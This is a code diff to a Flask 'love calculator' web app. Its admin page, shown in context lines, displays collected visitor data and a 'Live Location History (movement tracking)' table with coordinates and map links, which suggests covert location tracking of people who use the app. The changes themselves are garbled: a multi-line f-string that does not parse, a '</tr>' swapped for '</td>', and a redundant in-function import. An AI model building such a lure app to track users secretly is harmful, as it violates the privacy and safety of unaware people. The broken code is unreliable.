@@ -100,9 +100,10 @@ def get_love_message(name1, name2, percentage):
 # ---------- Flask Routes ----------
 @app.route('/')
 def index():
-    # Read the HTML file (it will be included in the Vercel deployment)
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    html_path = os.path.join(base_dir, 'index.html')
+    # Read the HTML file from the static folder
+    import os
+    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    html_path = os.path.join(base_dir, 'static', 'index.html')
     try:
         with open(html_path, 'r', encoding='utf-8') as f:
             html_content = f.read()
@@ -189,7 +190,7 @@ def admin():
                     else:
                         display_val = str(val)[:500]
                     html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
-                html += '</tr>'
+                html += '</td>'
             html += '</table></div>'
 
             html += '<hr><h2>📍 Live Location History (movement tracking)</h2>'
@@ -201,7 +202,27 @@ def admin():
                     html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                     for ts, lat, lon in hist:
                         map_link = f'https://www.google.com/maps?q={lat},{lon}'
-                        html += f'<tr><td style="white-space:nowrap;">{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">View</a></td></tr>'
+                        html += f'<tr><td style="white-space:nowrap;">{ts}</td>
+
+
+
+
+{lat}</td>
+
+
+
+
+{lon}</td>
+
+
+
+
+<a href="{map_link}" target="_blank">View</a></td>
+
+
+
+
+'   # (keep the HTML string properly)
                     html += '</table>'
             return html
         else:
@@ -260,5 +281,6 @@ def calculate_love():
     message = get_love_message(name1, name2, percentage)
     return jsonify({'percentage': percentage, 'message': message})
 
-# Vercel requires the app to be exposed as 'app'
-# This is already the case (app = Flask(__name__))
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
